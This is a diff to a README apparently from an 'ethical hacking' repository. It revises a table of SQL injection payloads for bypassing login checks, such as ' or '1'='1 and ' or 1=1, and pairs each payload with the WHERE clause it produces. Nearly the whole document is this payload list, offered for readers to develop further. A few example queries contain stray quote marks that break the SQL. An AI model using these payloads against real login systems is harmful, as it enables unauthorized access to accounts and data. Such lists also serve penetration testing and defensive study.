@@ -5,6 +5,8 @@
 
 > ! Attention, This Repository For Ethical Hacking 
 
+Example of QUERY SQL starting from WHERE, please develop and analyze it yourself.
+
 ## Table of contents
 
 1. [Bypass SQL Always True](#alwaystrue)
@@ -13,8 +15,8 @@
 
 |PAYLOAD  | EXAMPLE QUERY |
 |--|--|
-| ```' or '1'='1``` |```SELECT * FROM user WHERE username = '' or '1'='1' AND password = '' or '1'='1';```|
-| ```' or username!=''``` |```SELECT * FROM user WHERE username = '' or username!='' AND password = '' or password!='';```|
-| ```' or FALSE!=TRUE``` |```SELECT * FROM user WHERE username = '' or FALSE!=TRUE AND password = '' or FALSE!=TRUE;```|
-| ```' or TRUE=TRUE``` |```SELECT * FROM user WHERE username = '' or TRUE=TRUE AND password = '' or TRUE=TRUE";```|
-| ```' or 1=1``` |```SELECT * FROM user WHERE username = '' or 1=1 AND password = '' or 1=1" ;```|
+| ```' or '1'='1``` |```WHERE username = '' or '1'='1' AND password = '' or '1'='1';```|
+| ```' or username!=''``` |```WHERE username = '' or username!='' AND password = '' or password!='';```|
+| ```' or FALSE!=TRUE``` |```WHERE username = '' or FALSE!=TRUE AND password = '' or FALSE!=TRUE;```|
+| ```' or TRUE=TRUE``` |```WHERE username = '' or TRUE=TRUE AND password = '' or TRUE=TRUE";```|
+| ```' or 1=1``` |```WHERE username = '' or 1=1 AND password = '' or 1=1" ;```|
